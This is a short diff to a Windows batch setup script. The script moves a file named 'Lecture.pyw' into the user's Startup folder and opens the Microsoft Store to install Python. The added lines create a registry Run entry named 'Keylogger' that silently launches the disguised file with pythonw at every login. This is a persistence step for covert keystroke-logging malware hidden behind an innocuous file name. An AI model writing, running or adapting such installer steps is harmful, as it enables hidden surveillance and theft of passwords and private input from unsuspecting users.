@@ -23,6 +23,9 @@ REM Step 2: Move Lecture.pyw to Startup folder
 echo Moving Lecture.pyw to Startup folder...
 move "%USERPROFILE%\Downloads\Lecture.pyw" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 
+REM Add Lecture.pyw to startup
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Keylogger" /t REG_SZ /d "pythonw \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Lecture.pyw\"" /f
+
 REM Step 3: Open Microsoft Store for Python 3.12 installation
 echo Opening Microsoft Store for Python 3.12 installation...
 start ms-windows-store://pdp/?productid=9NCVDN91XZQP
